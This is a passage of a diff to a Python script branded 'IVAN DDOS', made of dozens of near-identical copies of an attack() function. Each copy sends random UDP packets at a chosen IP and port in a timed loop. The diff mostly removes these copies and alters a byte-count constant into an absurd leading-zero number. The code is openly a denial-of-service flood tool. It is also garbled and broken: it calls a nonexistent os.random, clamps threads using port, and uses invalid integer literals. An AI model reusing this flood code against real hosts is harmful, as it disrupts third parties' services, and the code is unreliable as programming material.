-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -28103,225 +19767,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -28697,7 +20143,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -28729,7 +20175,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -28761,7 +20207,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -28793,7 +20239,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -28825,7 +20271,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -28851,7 +20297,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -28883,39 +20329,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -28947,7 +20361,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -28979,415 +20393,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
